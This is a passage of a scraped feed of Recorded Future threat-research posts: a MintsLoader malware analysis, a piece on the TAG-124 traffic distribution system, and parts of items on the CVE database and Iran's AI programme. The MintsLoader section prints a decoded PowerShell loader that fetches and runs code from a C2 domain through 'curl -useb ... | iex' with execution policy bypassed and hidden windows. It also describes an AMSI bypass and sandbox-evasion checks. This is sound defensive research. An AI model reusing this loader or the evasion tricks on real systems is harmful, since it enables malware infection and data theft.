includes details on the first- and second-stage payloads and MintsLoader infrastructure.\nMintsLoader Attack Chain\nMintsLoader is commonly delivered via phishing emails containing links to KongTuke or ClickFix pages. When executed, these pages retrieve and run the first stage of JavaScript. The JavaScript is heavily obfuscated, and execution leads to running a PowerShell command to download and execute the second stage of MintsLoader, as shown in Figure 9.\nFigure 9: First stage of MintsLoader infection (Source: Recorded Future Malware Intelligence)\nThis second stage conducts environment checks to determine whether it is running in a sandbox or virtualized setting. Next, the script uses a DGA to produce the next C2 domain. MintsLoader then attempts to contact the generated domain to download the final payload, such as GhostWeaver, StealC, or the BOINC client. Figure 10 shows a high-level overview of this attack chain.\nFigure 10: Common MintsLoader infection chain (Source: Recorded Future)\nStage One: JavaScript\nThe initial stage of MintsLoader consists of a JavaScript file that executes a PowerShell command to retrieve the second stage. The script is heavily obfuscated using junk comments, non-readable variables and function names, character replacement, and string encoding (Figure 11). Insikt Group found 141 MintsLoader stage one samples using data derived from Recorded Future Malware Intelligence Hunting (Appendix A).\nFigure 11: MintsLoader stage one obfuscated JavaScript (Source: Recorded Future)\nThe core function of the stage one JavaScript payload is to run a PowerShell command that executes the command ‘curl -useb http://[domain]/1.php?s=[campaign]’, which downloads and executes the second stage. When ‘curl’ is used in PowerShell with the option ‘-useb’, it is an alias for Invoke-WebRequest, and the program cURL is not actually used to make the HTTP request.\nInsikt Group identified three distinct versions of the stage one loader, all of which employ the same JavaScript obfuscation techniques but differ in implementing the deployed PowerShell.\nThe first variant executes the PowerShell command in clear text, with the C2 domain hard-coded, as shown in Figure 12. This variant is seen in “mints13” and “flibabc11” campaigns.\nFigure 12: Clear text stage one PowerShell command (Source: Recorded Future Malware Intelligence)\nIn the second variation, the PowerShell command is obfuscated using character replacement. The C2 domain is still hard-coded, and an alias for the curl command is used instead, but the object is still to download the next stage (Figure 13). This is the most widely used variant across the campaigns: “flibabc21”, “flibabc22”, ”mints11”, “mints13”, “mints21”, and “mints42”.\nFigure 13: Clear text stage one obfuscated PowerShell command (Source: Recorded Future Malware Intelligence)\nThe third variation encodes the command in Base64 (Figure 14). Insikt Group has seen this method used with the older campaign “mints13”.\nFigure 14: Base64 text stage-one PowerShell command (Source: Recorded Future Malware Intelligence)\nHowever, in this version, the PowerShell command creates a file containing the PowerShell command to download the second stage via cURL. It then runs the file and deletes it.\n$ErrorActionPreference = \"Continue\"\n$randomNamePart1 = -join ((48..57) + (97..122) | Get-Random -Count 5 | % { [char]$_ });\n$currentTimeHour = [int](Get-Date -Format HH);\n$currentTimeMinute = [int](Get-Date -Format mm);\n$minuteAdjustment = 3;\nIf ($currentTimeMinute + $minuteAdjustment -gt 59) {\n$currentTimeHour = $currentTimeHour + 1;\n$currentTimeMinute = $currentTimeMinute + $minuteAdjustment - 60;\n} Else {\n$currentTimeMinute = $currentTimeMinute + $minuteAdjustment;\n};\n\n$currentTimeHour = If (([int](Get-Date -Format HH) + 1) -gt 23) { \"00\" } Else { $currentTimeHour };\n$randomNamePart2 = -join ((65..90) + (97..122) | Get-Random -Count 12 | % { [char]$_ });\n$scriptToExecute = @\"\n$ErrorActionPreference = \"Continue\"\ncurl -useb \"http://gibuzuy37v2v\\\\[.]top/1.php?s=mints13\" | iex;\nRemove-Item \"C:\\Users\\Public\\Documents\\$($randomNamePart2).ps1\" -Force\n\"@;\n\"powershell -noprofile -executionpolicy bypass -WindowStyle hidden -c $($scriptToExecute)\" | Out-File -FilePath \"C:\\Users\\Public\\Documents\\$($randomNamePart2).ps1\";\npowershell -noprofile -executionpolicy bypass -WindowStyle hidden -File \"C:\\Users\\Public\\Documents\\$($randomNamePart2).ps1\";\nRemove-Item \"$env:APPDATA\\*.ps1\" -Force\nRemove-Item \"$env:APPDATA\\*.bat\" -Force\nTable 1: Decoded base64 text stage one PowerShell (Source: Recorded Future)\nStage One C2 Communication\nExecuting any variant results in an HTTP GET request to the hard-coded domain to retrieve the second-stage payload. A successful request will retrieve and execute the PowerShell script shown in Figure 15.\nFigure 15: Successful stage two retrieval from C2 (Source: Recorded Future)\nIf the DGA domain is no longer valid, a 302 response is returned, as shown in Figure 16.\nFigure 16: Failed stage two retrieval from C2 (Source: Recorded Future)\nStage Two PowerShell\nThe second stage, PowerShell, contains a Base64-encoded string. After XOR decoding and uncompressing, the primary payload, which is also obfuscated, is yielded. Figure 17 shows a snippet of this payload, illustrating MintsLoader's obfuscated string construction techniques.\nFigure 17: Stage two PowerShell obfuscation (Source: Recorded Future)\nAfter the initial deobfuscation and decoding, the second stage of PowerShell starts by attempting to bypass Antimalware Scan Interface (AMSI) using a known technique to fake AMSI initialization failure: setting the variable amsiInitFailed of the System.Management.Automation.AmsiUtils object to TRUE.\nThe rest of the code is responsible for executing three system information queries: the return values used in logical expressions to detect whether the system is running on bare metal, sandbox, or virtual machine. This is conveyed to the C2 through an integer variable sent as the URL parameter key, and the C2 examines its value to determine if its response will return a third stage that downloads the final payload or a decoy. It should be noted that the constant integer values used to increment the key variable change with each second-stage sample.\nThe result of each system information query is checked against three logical expressions, the order of which varies per sample, along with constants that increment the key, whose results affect the key variable value. The logical expressions may not provide apparent results on initial inspection. For example, if the first deobfuscated system check, shown below in Figure 18, were to run on a virtual machine, the $isVirtualMachine variable would be equal to $true. The logical expression \"$true -eq 3\" evaluates to $true in PowerShell, increasing the key by 15310805757 instead of 83670406277.\nFigure 18: Stage two PowerShell virtual machine check (Source: Recorded Future)\nThe second system check queries the AdapterDACType member of the Win32_VideoController WMI object to obtain the name or identifier of the digital-to-analog converter (DAC) chip, as shown in Figure 19. This determines whether the infected system is running on an emulator or virtually. Typically, a Windows system will return \"Internal\" and/or \"Integrated RAMDAC,\" which would increment the key by 14467965888 in this example.\nFigure 19: Stage two PowerShell video controller check (Source: Recorded Future)\nThe third system check queries the purpose member of the Win32_CacheMemory WMI object, which will equal \"L1 Cache\" on a typical Windows system. The non-obvious logical expression \"$l1CachePurpose.length —gt 4\" will execute in the optimal case, incrementing the key value by 27424330481 in the deobfuscated example seen in Figure 20.\nFigure 20: Stage two PowerShell memory check (Source: Recorded Future)\nThe system checks and calculation of the key are followed by generating a random seed based on the date and a constant, which is used with a system.Random object to construct the domain using a simple DGA and the URL path, as shown in Figure 21. The author may have made a mistake by not using the second random variable to construct the URL path. Instead, they use an undefined variable for the URL path ending, making the URL path ending a constant \"htr.php\". Note that in PowerShell, curl is an alias for Invoke-WebRequest, which is used to generate the request to the C2 for the third stage, so the User-Agent HTTP header will include PowerShell version information, not curl.\nFigure 21: Stage two PowerShell final payload retrieval (Source: Recorded Future)\nStage Two C2 Communication\nFigure 22 shows an example of a MintsLoader request for the final payload, with a URL path ending in htr.php. The URL parameter id is the hostname, and the URL parameter s is the campaign ID.\nFigure 22: Recent stage two C2 GET Request (Source: Recorded Future)\nAn example of an earlier MintsLoader request for the third stage is shown in Figure 23, with the URL path not randomized but instead the constant string \"2.php\".\nFigure 23: Older stage two C2 GET Request (Source: Recorded Future)\nIf the second-stage request does not meet specific requirements, the final payload may lead to a decoy executable (Figure 24), as in this example, which leads to an AsyncRAT decoy executable downloaded from the site temp[.]sh. This association with AsyncRAT led to initial naming in reports and some countermeasures for network traffic as \"AsyncRAT Loader\", which causes MintsLoader malware samples to be incorrectly tagged as AsyncRAT even though current MintsLoader campaigns do not deploy AsyncRAT.\nFigure 24: Stage three decoy response (Source: Recorded Future)\nA recent successful attempt is shown in Figure 25; in this example, the final payload is GhostWeaver.\nFigure 25: MintsLoader GhostWeaver payload (Source: Recorded Future)\nGhostWeaver\nOne of the most commonly observed payloads deployed by MintsLoader is GhostWeaver, a PowerShell-based remote access trojan (RAT) exhibiting code similarities and functional overlaps with MintsLoader. Notably, GhostWeaver can deploy MintsLoader as an additional payload via its sendPlugin command. Communication between GhostWeaver and its command-and-control (C2) server is secured through TLS encryption using an obfuscated, self-signed X.509 certificate embedded directly within the PowerShell script, which is leveraged for client-side authentication to the C2 infrastructure.\nGhostWeaver has periodically been misclassified as AsyncRAT. Insikt Group assesses with moderate confidence that this misclassification originated from Palo Alto Networks initially identifying a GhostWeaver sample (SHA256: fb0238b388d9448a6b36aca4e6a9e4fbcbac3afc239cb70251778d40351b5765) as a fileless AsyncRAT variant. GhostWeaver and AsyncRAT share certain characteristics within their self-signed X.509 certificates, such as identical expiration dates and serial number lengths; however, these similarities may simply reflect common certificate-generation methods rather than meaningful operational overlap.\nMintsLoader Infrastructure\nInsikt Group initially found MintsLoader C2 servers hosted solely on BLNWX but later observed its growing use of other ISPs such as Stark Industries Solutions Ltd (AS44477), GWY IT Pty Ltd.​ (AS199959), or SCALAXY-AS (58061), among others. MintsLoader C2 IP addresses announced via SCALAXY-AS are operated by hosting providers 3NT Solutions LLP and IROKO Networks Corporation, both of which are a part of the Russian-language bulletproof hosting provider Inferno Solutions (inferno[.]name). The switch to SCALAXY-AS and Stark Industries Solutions suggests that MintsLoader operators have shifted from relying on anonymous virtual private server (VPS) providers to more traditional bulletproof hosters, likely in an effort to harden their infrastructure against takedown attempts and enhance operational stability.\nOver the past several months, Insikt Group has identified a range of suspected additional campaign IDs and payloads (Table 2). This data is compiled from open research and Insikt Group’s internal research.\nCampaign ID\nObserved Final Payload\nLast Date Active\nNotes\n521\nStealC\n2025-04-20\n\n          \n522\nStealC\n2025-04-20\n\n          \n523\nStealC\n2025-04-20\nobserved in connection with AsyncRAT infections\n524\nStealC\n2025-04-20\nN/A\n527\nGhostWeaver\n2025-04-20\nLinked to TAG-124 by Insikt Group\nflibabc11\nGhostWeaver\n2025-04-20\n\n          \nflibabc12\nGhostWeaver\n2025-04-20\n\n          \nflibabc13\nGhostWeaver\n2025-04-20\n\n          \nflibabc14\nStealC\n2025-04-20\n\n          \nflibabc21\nGhostWeaver\n2025-04-20\n\n          \nflibabc22\nGhostWeaver\n2025-04-20\n\n          \nflibabc23\nGhostWeaver\n2025-04-20\n\n          \nflibabc25\nGhostWeaver\n2025-04-20\n\n          \n515\nN/A\nN/A\nObserved in connection with AsyncRAT infections\n578\nN/A\nN/A\nLinked to TAG-124 via the domain sesraw[.]com, which Insikt Group had previously linked to TAG-124\n579\nN/A\nN/A\nObserved in connection with AsyncRAT infections\nboicn\nN/A\nN/A\nObserved in connection with AsyncRAT infections\nmints1\nN/A\nN/A\nN/A\nmints11\nN/A\nN/A\nN/A\nmints12\nN/A\nN/A\nN/A\nmints13\nN/A\nN/A\nN/A\nmints21\nN/A\nN/A\nN/A\nTable 2: Suspected MintsLoader campaign IDs (Source: Recorded Future)\nTwo additional potential campaign IDs, js2 and dav, were observed in 2023, with js2 identified in an AsyncRAT infection.\nTo read the entire analysis, click here to download the report as a PDF.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_1a00954691a2ebb6393081be89bc2910631f38c68.png?width=1200&format=pjpg&optimize=medium"},"content":"Discover how MintsLoader operates as a stealthy, obfuscated malware loader distributing GhostWeaver, StealC, and BOINC.

One way advertisers achieve this is by using traffic distribution systems (TDSs), which collect information about potential customers to <a href=\"https://www.securitee.org/files/tds-www2021.pdf\">direct</a> them to highly targeted ads. Using data from the user’s browser, geolocation, and behavior, a TDS makes rapid decisions on directing traffic to get the most from ad spend. However, cybercriminals also use this infrastructure to deliver highly targeted malware to victims who are most likely to click their links. Malicious TDSs work in much the same way as legitimate TDSs, except they direct victims to the most effective malware instead of the most effective advertisement. Additionally, these TDSs provide a defensive measure to ensure the malware is not delivered to researchers or sandboxes that could analyze the code.</p>\n        <p>Insikt Group has been tracking how cybercriminals use these tools and <a href=\"/research/tag-124-multi-layered-tds-infrastructure-extensive-user-base\">identified</a> infrastructure linked to a highly active malicious TDS dubbed TAG-124. TAG-124 allows ransomware operators and other cybercriminals to maximize their chances of infecting their intended victims with their respective payloads. At least two ransomware groups have been observed using TAG-124 to infect victims in health care and other critical infrastructure, demonstrating the value of traffic distribution for “big game hunting” (targeting companies perceived as likely to pay out high extortion demands). While shared infrastructure like TAG-124 helps cybercriminals improve their efficiency and effectiveness, understanding TAG-124 infrastructure can help defenders block or even disable activity from multiple cyber threat actors simultaneously before compromise occurs.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"hidden-01.png\" src=\"https://www.recordedfuture.com/media_1d8f1e0ed43e4d3b6a6127364fabcfe722f566e49.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1442\" height=\"866\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 1:</em></strong> <em>Multiple threat actors use TAG-124 to direct victims to their malware (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h2>Multiple Threat Actors Use TAG-124 Infrastructure</h2>\n        <p>Insikt Group has observed multiple threat actors using this malicious TDS, including:</p>\n        <ul>\n          <li><strong>Rhysida Ransomware:</strong> A sophisticated <a href=\"/research/outmaneuvering-rhysida-advanced-threat-intelligence-shields-critical-infrastructure-ransomware\">ransomware-as-a-service</a> operation notable for extorting healthcare organizations and other critical infrastructure. In 2023, the group claimed responsibility for an attack on Prospect Medical Holdings, which <a href=\"https://www.scworld.com/news/rhysida-claims-responsibility-for-ransomware-attacks-on-prospect-medical-holdings\">resulted</a> in the theft of over 500,000 social security numbers and <a href=\"https://blog.barracuda.com/2024/05/09/rhysida-ransomware--the-creepy-crawling-criminal-hiding-in-the-d#:~:text=The%20Prospect%20Medical%20Holdings%20attack%20impacted%2017%20hospitals%20and%20166%20clinics%20across%20the%20United%20States.\">impacted</a> operations at seventeen hospitals and 166 clinics.</li>\n          <li><strong>Interlock Ransomware:</strong> Another ransomware group targeting primarily <a href=\"https://www.hipaajournal.com/interlock-ransomware-healthcare/\">healthcare organizations</a> and other “big game” to extort higher payouts through high-impact attacks on large organizations. In December 2024, the group <a href=\"https://www.bleepingcomputer.com/news/security/texas-tech-university-system-data-breach-impacts-14-million-patients/\">claimed</a> credit for an attack on the Texas Tech University Health Sciences Center, stealing 2.6 TB of sensitive personal data. Interlock shares many similarities with Rhysida, such as tactics, tools, and encryption behaviors, though the exact relationship between the two is <a href=\"https://x.com/prodaft/status/1896938856672280591?s=43\">unknown</a>.</li>\n          <li><strong>TA866 / Asylum Ambuscade:</strong> This cybercrime group <a href=\"https://www.welivesecurity.com/2023/06/08/asylum-ambuscade-crimeware-or-cyberespionage/\">engages in</a> financial targeting and cyber espionage very likely on behalf of the Russian government. The group has targeted bank customers and cryptocurrency traders across North America and Europe and carried out <a href=\"https://www.proofpoint.com/us/blog/threat-insight/security-brief-ta866-returns-large-email-campaign\">espionage</a> against government entities in Europe, Central Asia, and other areas.</li>\n        </ul>\n        <p>TAG-124 has also been associated with <a href=\"https://www.proofpoint.com/us/blog/threat-insight/part-1-socgholish-very-real-threat-very-fake-update\">SocGholish</a> and <a href=\"https://www.esentire.com/blog/exploring-the-d3f-ck-malware-as-a-service-loader\">D3F@ck</a> loader malware, which provide remote access and malware delivery for financially motivated activity. While Insikt Group does not know which criteria TAG-124 uses to filter and direct malicious content, its use of search engine optimization (SEO) poisoning and infecting legitimate sites allows for an enormous number of potential victims. By outsourcing initial infection to TAG-124, groups like Rhysida and Interlock can pursue “big game hunting” by specializing in techniques implemented during a later stage in the infection kill chain. These special techniques enable more effective extortion campaigns.</p>\n        <h3>Risk Outlook</h3>\n        <p>Successful big game hunting that results in large payouts allows sophisticated syndicates like Rhysida and Interlock to invest back into services that make their work more effective. This drives the increased specialization of groups like TAG-124, creating a virtuous cycle of cybercrime. As a result, businesses face an increasing risk of high-impact ransomware attacks and espionage-driven data theft: the links between TAG-124 and Asylum Ambuscade suggest that state-sponsored threat actors are also taking advantage of these services in addition to profit-motivated actors.</p>\n        <p>Defending against TAG-124 may be challenging due to its early role in the cyberattack life cycle, but missing intrusions early on can still have negative consequences for companies. For example, one of Rhysida’s latest victims, Sunflower Medical, is <a href=\"https://www.hipaajournal.com/sunflower-medical-group-data-breach-lawsuit/\">facing</a> a class action lawsuit because of its failure to implement security measures that would have detected the breach early in the infection cycle. According to the company, the intrusion was not discovered for three weeks following the initial breach. While it is unknown whether TAG-124 was used for this intrusion, the legal consequences demonstrate the significant risks of missing early signs of a breach.</p>\n        <h3>Mitigations</h3>\n        <p>TAG-124 is not the only TDS operating on behalf of threat actors. Other notable examples include <a href=\"https://www.darkreading.com/threat-intelligence/vextrio-tds-biggest-cybercrime-operation-web\">VexTrio</a>, <a href=\"https://www.securityweek.com/prometheus-tds-underground-service-distributing-several-malware-families/\">Prometheus TDS</a>, and <a href=\"https://sensorstechforum.com/blacktds-traffic-distribution-network-malicious/\">BlackTDS</a>, all of which offer competing malware delivery capabilities. Operators of these systems enable the increasing effectiveness of many different threat actors — primarily criminal, though occasionally state-sponsored — by providing professional infrastructure that adopts legitimate content delivery techniques for criminal use.

One way advertisers achieve this is by using traffic distribution systems (TDSs), which collect information about potential customers to direct them to highly targeted ads. Using data from the user’s browser, geolocation, and behavior, a TDS makes rapid decisions on directing traffic to get the most from ad spend. However, cybercriminals also use this infrastructure to deliver highly targeted malware to victims who are most likely to click their links. Malicious TDSs work in much the same way as legitimate TDSs, except they direct victims to the most effective malware instead of the most effective advertisement. Additionally, these TDSs provide a defensive measure to ensure the malware is not delivered to researchers or sandboxes that could analyze the code.\nInsikt Group has been tracking how cybercriminals use these tools and identified infrastructure linked to a highly active malicious TDS dubbed TAG-124. TAG-124 allows ransomware operators and other cybercriminals to maximize their chances of infecting their intended victims with their respective payloads. At least two ransomware groups have been observed using TAG-124 to infect victims in health care and other critical infrastructure, demonstrating the value of traffic distribution for “big game hunting” (targeting companies perceived as likely to pay out high extortion demands). While shared infrastructure like TAG-124 helps cybercriminals improve their efficiency and effectiveness, understanding TAG-124 infrastructure can help defenders block or even disable activity from multiple cyber threat actors simultaneously before compromise occurs.\nFigure 1: Multiple threat actors use TAG-124 to direct victims to their malware (Source: Recorded Future)\nMultiple Threat Actors Use TAG-124 Infrastructure\nInsikt Group has observed multiple threat actors using this malicious TDS, including:\nRhysida Ransomware: A sophisticated ransomware-as-a-service operation notable for extorting healthcare organizations and other critical infrastructure. In 2023, the group claimed responsibility for an attack on Prospect Medical Holdings, which resulted in the theft of over 500,000 social security numbers and impacted operations at seventeen hospitals and 166 clinics.\nInterlock Ransomware: Another ransomware group targeting primarily healthcare organizations and other “big game” to extort higher payouts through high-impact attacks on large organizations. In December 2024, the group claimed credit for an attack on the Texas Tech University Health Sciences Center, stealing 2.6 TB of sensitive personal data. Interlock shares many similarities with Rhysida, such as tactics, tools, and encryption behaviors, though the exact relationship between the two is unknown.\nTA866 / Asylum Ambuscade: This cybercrime group engages in financial targeting and cyber espionage very likely on behalf of the Russian government. The group has targeted bank customers and cryptocurrency traders across North America and Europe and carried out espionage against government entities in Europe, Central Asia, and other areas.\nTAG-124 has also been associated with SocGholish and D3F@ck loader malware, which provide remote access and malware delivery for financially motivated activity. While Insikt Group does not know which criteria TAG-124 uses to filter and direct malicious content, its use of search engine optimization (SEO) poisoning and infecting legitimate sites allows for an enormous number of potential victims. By outsourcing initial infection to TAG-124, groups like Rhysida and Interlock can pursue “big game hunting” by specializing in techniques implemented during a later stage in the infection kill chain. These special techniques enable more effective extortion campaigns.\nRisk Outlook\nSuccessful big game hunting that results in large payouts allows sophisticated syndicates like Rhysida and Interlock to invest back into services that make their work more effective. This drives the increased specialization of groups like TAG-124, creating a virtuous cycle of cybercrime. As a result, businesses face an increasing risk of high-impact ransomware attacks and espionage-driven data theft: the links between TAG-124 and Asylum Ambuscade suggest that state-sponsored threat actors are also taking advantage of these services in addition to profit-motivated actors.\nDefending against TAG-124 may be challenging due to its early role in the cyberattack life cycle, but missing intrusions early on can still have negative consequences for companies. For example, one of Rhysida’s latest victims, Sunflower Medical, is facing a class action lawsuit because of its failure to implement security measures that would have detected the breach early in the infection cycle. According to the company, the intrusion was not discovered for three weeks following the initial breach. While it is unknown whether TAG-124 was used for this intrusion, the legal consequences demonstrate the significant risks of missing early signs of a breach.\nMitigations\nTAG-124 is not the only TDS operating on behalf of threat actors. Other notable examples include VexTrio, Prometheus TDS, and BlackTDS, all of which offer competing malware delivery capabilities. Operators of these systems enable the increasing effectiveness of many different threat actors — primarily criminal, though occasionally state-sponsored — by providing professional infrastructure that adopts legitimate content delivery techniques for criminal use. However, identifying indicators of malicious TDS can help defenders detect and block multiple threat actors early in the attack kill chain.\nInsikt Group recommends the following measures:\nAdvanced threat detection: In addition to blocking known indicators, use host- and log-based detections, such as YARA, Snort, and Sigma rules found in Recorded Future’s Intelligence Cloud, for custom file scanning and detection. These detections can help identify unwanted tools or other suspicious activity.\nUser education: Educate users on the risks of SEO poisoning and urge caution when browsing. In particular, urge caution against unprompted downloads for Google Chrome updates and other indicators associated with TAG-124 infrastructure.\nSecure browser setting: Enable automatic browser updates and blocking pop-ups to reduce exposure to malicious update prompts.\nFor more information on TAG-124 and other emerging threats in malware, check out Insikt Group’s 2024 Malicious Infrastructure Report.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/blog/media_1fe936e500bd937aa9ce6625b90da6ecfe1d03b8c.png?width=1200&format=pjpg&optimize=medium"},"content":"Discover how cybercriminals use malicious Traffic Distribution Systems like TAG-124 to deliver ransomware and malware to high-value targets in healthcare and critical infrastructure.","contentSnippet":"Discover how cybercriminals use malicious Traffic Distribution Systems like TAG-124 to deliver ransomware and malware to high-value targets in healthcare and critical infrastructure.","guid":"https://www.recordedfuture.com/blog/massive-hidden-infrastructure-enabling-big-game-hunting-at-scale","categories":["Blog"],"isoDate":"1970-01-21T04:48:00.000Z","tag":"intel"},{"title":"Why the MITRE CVE Database Scare Proves Multi-Source Vulnerability Intelligence Is Essential","link":"https://www.recordedfuture.com/blog/when-vulnerability-information-flows-are-vulnerable-themselves","pubDate":"Wed, 21 Jan 1970 04:42:14 GMT","content:encoded":"\n        <h2>What We Can Learn From The Recent News About the Unknown Future of MITRE’s CVE Database</h2>\n        <p>Over the last several days, we have received a lot of inquiries from customers and partners about the recent news on the unknown future of the MITRE National Vulnerability (NVD) database.

Since the Supreme Leader issued a directive in 2021, Iran has endeavored to develop a national strategy and oversight mechanism for AI and foster a technological ecosystem to drive domestic research and development. However, two key factors — Tehran’s global economic isolation, and its deeply entrenched system of government control and oversight — have almost certainly hindered Iran’s national AI development.</p>\n        <p>In 2024, as Tehran’s support for its proxies Hamas and Hezbollah against Israel embroiled Iran in unprecedented regional conflicts and ongoing cyberwarfare, new insights emerged about how Iran has implemented AI technologies in its national security apparatus. Iran has used AI to bolster its capabilities in four main areas: cyberattacks, influence operations, military and intelligence systems, and domestic repression. These priorities will continue to propel Iran’s development and implementation of AI, almost certainly posing an increasing threat to Iran’s Western and regional adversaries. In cyberspace, AI will likely augment Iranian threat actors’ spearphishing and social engineering tradecraft, while AI’s implementation in Iran’s drone and missile arsenal is likely to pose the greatest physical threat from emerging technology.</p>\n        <p>Iran’s approach to AI will likely mirror its broader strategic ambitions — to be a regional power and assert its national sovereignty — by building and implementing advanced technological capabilities. Iranian government initiatives are likely to be the driving force behind Iran’s AI development priorities, particularly given the absence of a flourishing AI private sector. While Tehran will promote its own technological prowess and indigenous AI development, the Iranian government is likely to leverage its relationship with China and Russia in various security realms to bolster its AI technology capabilities. Private industry, particularly companies in the AI or technology resources industry, should closely monitor end users of their models or materials to ensure Iranian threat actors are not using their products or acquiring controlled technologies. Similarly, governments should invest in identifying and preventing the Iranian defense industry from acquiring AI technologies that enhance its military capabilities.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Iran has articulated lofty goals for its AI advancement and seeks to compete in the global AI race, but it is almost certainly hindered by two factors: First, its economic and commercial isolation limits its access to technological resources and human capital. Second, its top-down government control and oversight stifles private innovation in AI.</li>\n          <li>To augment its own indigenous research and development (R&amp;D) capabilities in AI, Iran will likely leverage its bilateral and regional relationships for technology engagement with China, Russia, and other non-Western countries.</li>\n          <li>Amidst unprecedented domestic upheaval and regional conflict over the last three years, Iran very likely views AI as a key force multiplier for its national security and defense and has sought to integrate AI into its cyber and influence operations, military systems, and domestic surveillance infrastructure.</li>\n          <li>It is very likely that Iranian threat actors will increasingly use generative AI and large language models (LLMs) to enhance their influence and cyber operations, increasing risk to adversarial governments, as well as their critical infrastructure, technology companies, and other security-related industries.</li>\n          <li>Iran has very likely endeavored to implement AI in its military defense systems and publicly touts the capability, though its operational uses of the technologies remain unproven.</li>\n          <li>In the domestic sphere, Iran has very likely increased its efforts to deploy AI for morality enforcement and opposition monitoring, to enhance its control over Iranian society, particularly after the Woman Life Freedom protest movement.</li>\n          <li>Companies and governments should maintain vigilance in cybersecurity practices to reduce vulnerabilities to AI-enabled cyber and influence operations and limit Iran’s access to AI resources and expertise that could increase Tehran’s threat to regional security.</li>\n        </ul>\n        <h2>Iran’s AI Ambitions</h2>\n        <p>At the highest level of its leadership, Iran has recognized and sought to develop an overarching national focus on AI ( هوش مصنوعی in Persian). In November 2021, Supreme Leader Ali Khamenei called AI “an important and futuristic issue” that will “play a role in the future administration of the world,” and <a href=\"https://www.memri.org/reports/irans-supreme-leader-khamenei-we-must-master-all-layers-artificial-intelligence-technology\">urged</a> Iran to become a top ten country in the field of AI. In August 2024, Khamenei urged Iran to “master” and “develop the deep and diverse layers of AI technology,” warning that a global oversight body (similar to the International Atomic Energy Agency [IAEA]) might regulate its use in the future. Khamenei’s stated ambition for Iran’s AI prominence initiated a flurry of government-led activity to develop and implement a national strategy and technological ecosystem to align with the Supreme Leader’s intent. Iran subsequently began creating a national AI roadmap that evaluated the “strategic documents” of 23 countries in the field of AI and developed a plan to realize Khamenei’s goal by 2032. The goals of the roadmap document were to achieve “80 percent of research to meet the needs of the country, use of 45 percent of AI in industries, $8 billion investment in AI, and a 12 percent share of AI in the GDP.\" The document contained fourteen “macro policies,” 47 “micro-policies,” 39 “general actions,” and 155 “projects and activities.” According to the roadmap, by the Persian year 1410 (starting March 2031), Iran would need to train 600,000 experts in the AI field to accomplish these objectives.</p>\n        <p>Iran’s presidency — specifically, the Vice Presidency for Science, Technology and Knowledge-based Economy — oversees the Iranian government’s effort to establish and implement an AI strategy. On December 3, 2023, President Ebrahim Raisi issued an executive order to establish the “National Steering Committee and the National Artificial Intelligence (AI) Center,” which would “focus on creating integrated AI processing and data service providers, aligning with the country’s needs, and implementing large-scale AI projects.\" He appointed Reshad Hosseini as Secretary for the Development of Artificial Intelligence and Robotics Headquarters, a role intended to develop a “technology development roadmap” and to make “maximum use of all the internal capacity of the innovation ecosystem.\" Iran’s AI Strategic Council was to be formed of “ministers and heads of relevant institutions” to “implement, coordinate, and monitor” a National AI Document.</p>\n        <p>After Raisi’s death in May 2024, the administration of President Masoud Pezeshkian has continued to emphasize Iran’s AI strategy. The National AI Organization (or the National Organization for AI) was inaugurated in July 2024 in Tehran. Insikt Group identified the organization’s physical location in north central Tehran, on Molla Sadra Street (Figures 1-3). During Pezeshkian’s endorsement ceremony and National Government Week meeting in August 2024, Khamenei advised the new administration that the ”good initiative” begun under deceased President Raisi “unfortunately remains unfinished,” but advised that the National AI Organization, under the direct supervision of the President, should continue Raisi’s progress. On October 15, 2024, Iran’s Information Technology Council issued a decision that “within two months, the National Organization of Artificial Intelligence should present to the working group the requirements for creating, developing, maintaining and publishing data and information in the hyper scale database of artificial intelligence.\"</p>\n        <p>Pezeshkian appointed Hossein Afshin, a professor of mechanical engineering at Sharif University of Technology, as his Vice President for Science, Technology, and Knowledge-based Economy, who also serves as the secretary and vice president of the National AI Organization and serves as the face of AI development within Iran. Pezeshkian also assigned his First Vice President, Dr. Mohammad Reza Aref, as chairman of the National AI Organization and its strategic council. Aref’s appointment as First Vice President <a href=\"https://amwaj.media/en/media-monitor/critics-slam-return-of-lord-of-silence-as-iran-s-first-vice-president\">prompted</a> criticism for his “political obscurity,” likely reflecting Pezeshkian’s choice for the position was based on his scientific prowess and technical acuity rather than his accomplishments as a reformist politician. The prominent role of Aref — who holds two advanced degrees in electrical engineering from Stanford University, has been a professor at two prestigious Iranian universities, and has <a href=\"https://ieeexplore.ieee.org/author/37300306900\">published</a> scholarly articles on information technology — as Pezeshkian’s deputy with oversight of the country’s AI program suggests an increasing recognition of the importance of AI.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"iran-ai-001.png\" src=\"https://www.recordedfuture.com/media_186c53d333fb4588418e23b5e75c129cf70be71f9.png?width=750&amp;format=png&amp;optimize=medium\" width=\"777\" height=\"420\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 1:</em></strong> <em>Inauguration of Iran’s National Artificial Intelligence Organization in Tehran (Source: Mehr News)</em></div>\n          </div>\n        </div>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"iran-ai-002.png\" src=\"https://www.recordedfuture.com/media_1584a05539ef5b0ebdecbb7bb84ac1b99d17fb686.png?width=750&amp;format=png&amp;optimize=medium\" width=\"815\" height=\"543\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 2:</em></strong> <em>Exterior of the National Artificial Intelligence Organization (Source:</em> <em><a href=\"https://maps.app.goo.gl/GN4RRv5iSHZNqmbT7\">Google Maps</a>)</em></div>\n          </div>\n        </div>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"iran-ai-003.png\" src=\"https://www.recordedfuture.com/media_15d6f7fc140ba6265c35fd701efb283d1d1b418ee.png?width=750&amp;format=png&amp;optimize=medium\" width=\"648\" height=\"493\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 3:</em></strong> <em>Location of the National Artificial Intelligence Organization (Source:</em> <em><a href=\"https://maps.app.goo.gl/GN4RRv5iSHZNqmbT7\">Google Maps</a>)</em></div>\n          </div>\n        </div>\n        <h2>Laying the Foundations of an AI Ecosystem</h2>\n        <p>Insikt Group examined 